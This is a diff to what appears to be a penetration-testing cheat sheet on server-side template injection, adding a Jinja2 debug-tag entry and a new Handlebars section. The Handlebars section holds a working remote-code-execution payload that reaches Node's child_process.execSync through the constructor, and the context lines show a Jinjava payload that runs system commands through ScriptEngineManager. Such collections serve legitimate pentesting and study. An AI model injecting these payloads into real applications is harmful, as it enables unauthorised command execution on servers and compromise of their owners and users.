@@ -35,6 +35,7 @@
 * [Jinja2](#jinja2)
   * [Basic injection](#basic-injection)
   * [Template format](#template-format)
+  * [Debug Statement](#debug-statement)
   * [Dump all used classes](#dump-all-used-classes)
   * [Dump all config variables](#dump-all-config-variables)
   * [Read remote file](#read-remote-file)
@@ -44,6 +45,7 @@
 * [Jinjava](#jinjava)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
+* [Handlebars](#handlebars)
 * [ASP.NET Razor](#aspnet-razor)
   * [Basic injection](#basic-injection)
   * [Command execution](#command-execution)
@@ -338,6 +340,16 @@ The above injections have been tested on Flask application.
 
 ```
 
+### Debug Statement¶
+
+If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
+
+```python
+<pre>{% debug %}</pre>
+```
+
+Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
+
 ### Dump all used classes
 
 ```python
@@ -475,6 +487,37 @@ Fixed by https://github.com/HubSpot/jinjava/pull/230
 
 {{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
 ```
+
+## Handlebars
+
+### Command Execution
+
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
+
+### References
+
+- [Handlebars template injection and RCE in a Shopify app ](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)
+- [Lab: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)
 
 ## ASP.NET Razor
 
